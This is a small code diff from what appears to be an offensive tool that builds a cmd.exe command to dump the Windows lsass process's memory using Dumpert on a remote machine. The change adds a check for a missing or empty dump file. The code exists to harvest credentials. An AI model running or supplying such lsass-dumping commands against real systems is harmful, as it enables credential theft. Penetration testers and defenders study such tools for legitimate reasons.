@@ -221,9 +221,8 @@ class Dumper:
         self.dumpert = True
 
         # Dump lsass using PID
-        command = """cmd.exe /Q /c {}{} & if NOT EXIST {}{} (echo FAILED > {}{})""".format(
+        command = """cmd.exe /Q /c {}{} & for %A in ({}{}) do IF NOT EXIST %A ( echo FAILED > %A ) ELSE IF %~zA==0 ( echo FAILED > %A )""".format(
             self._tmp_dir, self._dumpert,
-            self._tmp_dir, self._remote_lsass_dump,
             self._tmp_dir, self._remote_lsass_dump
         )
         self._log.debug("Command : {}".format(command))
